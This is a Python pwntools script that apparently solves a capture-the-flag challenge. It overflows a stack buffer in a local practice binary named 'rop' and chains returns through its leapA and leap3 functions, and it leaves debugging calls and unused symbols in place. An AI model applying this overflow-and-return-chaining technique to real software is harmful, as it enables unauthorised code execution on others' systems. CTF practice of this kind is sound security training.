#!/usr/bin/env python

from pwn import *

context.log_level = 'error'

#set process and ELF
p = process('./rop')
e = ELF('./rop')
#offset for overflow and EIP control
offset = 28

gdb.attach(p)
#addresses
vuln = e.symbols['vuln']
leapA = e.symbols['leapA']
leap2 = e.symbols['leap2']
leap3 = e.symbols['leap3']
flag = e.symbols['display_flag']
main = e.symbols['main']
puts_got = e.got['puts']
puts_plt = e.symbols['puts']

#leapA
payload = ''
payload+= 'A'*offset
payload+= p32(leapA)
payload+= p32(leap3)

p.sendlineafter('>', payload)

#leapA (again)
payload = ''
payload+= 'A'*offset
payload+= p32(leapA)
payload+= p32(main)

p.sendlineafter('>', payload)

#leap3
payload = ''
payload+= 'A'*offset
payload+= p32(leap3)
payload+= p32(main)

p.sendlineafter('>', payload)

p.interactive()